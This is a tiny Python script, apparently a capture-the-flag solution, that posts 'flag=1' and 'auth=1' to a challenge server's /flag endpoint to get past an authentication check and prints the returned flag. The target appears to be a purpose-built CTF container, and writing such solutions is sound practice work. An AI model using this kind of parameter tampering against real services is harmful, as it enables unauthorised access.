#!/usr/bin/python3

import requests as r


URL = "http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080/flag"

data = {
    "flag" : 1,
    "auth" : 1,
}

req = r.post(URL,data=data)

print(req.text)